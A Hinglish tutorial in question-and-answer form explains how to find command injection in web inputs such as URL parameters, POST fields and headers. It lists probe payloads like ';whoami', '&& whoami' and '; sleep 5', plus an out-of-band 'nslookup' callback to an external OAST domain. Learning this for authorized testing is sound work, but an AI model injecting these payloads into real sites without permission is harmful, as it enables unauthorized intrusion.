### 🔹 1. **Kya hum kisi bhi parameter me semicolon + whoami laga sakte hain?**

👉 **Nahi, sirf vulnerable jagah par.**
Sab parameters vulnerable nahi hote. Command injection tab hota hai jab server **input directly system command me pass karta hai**.

Example:

* Product stock check (jaise: `stock=10`) → backend pe shayad `ping` ya `cat` chal rahi ho → yahan injection chance hai.
* Headers (User-Agent, Referer, Cookie) → agar backend unhe system commands me use karta hai, to yahan bhi injection ho sakta hai.
* Form fields (name, feedback message) → agar backend unko shell commands me pass kare.

---

### 🔹 2. **Kya sirf `=` wale parameters me injection hota hai?**

👉 Mostly haan, kyunki backend `parameter=value` format ko process karta hai.
Example:

```
?id=1;whoami
```

Ya POST data:

```
username=habib;whoami&password=123
```

Lekin headers me to `=` ki zaroorat bhi nahi hoti:

```
User-Agent: Habib; whoami
```

---

### 🔹 3. **GET ya POST request?**

👉 Command injection **dono me ho sakta hai**.

* **GET**: URL parameters ke through.

  ```
  GET /product?id=1;whoami HTTP/1.1
  ```
* **POST**: Form ya JSON data ke through.

  ```
  POST /login
  username=habib;whoami&password=123
  ```

Aur headers me bhi possible hai (GET/POST dono ke saath).

**Jahaan backend tumhari input ko system ke shell command me daale**, wahi injection hoga — chahe wo query string ho, form data ho, ya headers.

---

## 🔹 4. Real websites me kaise pata chalega ke konsa parameter vulnerable hai?

Command injection **random try se nahi**, balki **testing approach** se samajh aata hai.

### Step-by-step:

1. **Identify Input Points**

   * GET parameters (`?id=1`)
   * POST form fields (`username=abc`)
   * Headers (`User-Agent`, `Referer`, `Cookie`)
   * JSON/XML bodies

2. **Inject simple payloads**

   * `;whoami`
   * `&& whoami`
   * `| whoami`

3. **Look for response difference**

   * Agar response me unusual delay aata hai → maybe command execute hui. (Example: `; sleep 5`)
   * Agar output me command ka result aata hai (like username, error message) → confirmed injection.

4. **Out-of-band test (OAST)**
   Agar response me kuch visible nahi, to DNS/HTTP log check karo.
   Example:

   ```
   ;nslookup habib.oastify.com
   ```

   Agar teri OAST service pe hit aata hai → injection confirmed.

👉 Matlab real websites me tu systematically har parameter pe **payload inject karke reaction observe karega**.

---

## 🔹 5. Parameters vs Headers ka farq

* **Parameters**:

  * Ye URL ya form ka part hote hain.
  * Format: `key=value`
  * Example:

    ```
    GET /product?id=10&category=shoes
    ```
  * Server mostly inhe database ya internal command me use karta hai.

* **Headers**:

  * Ye HTTP request ke meta-information hote hain.
  * Format: `Header-Name: Value`
  * Example:

    ```
    User-Agent: Mozilla/5.0
    Cookie: session=abcd
    ```
  * Server headers ko logging, auth, ya request handling ke liye use karta hai. Agar backend command line tools ke sath use kare to injection ka chance hai.

---

⚡ **Short difference:**

* Parameters → data jo user directly bhejta hai.
* Headers → request ke sath extra info jo browser ya user bhejta hai.

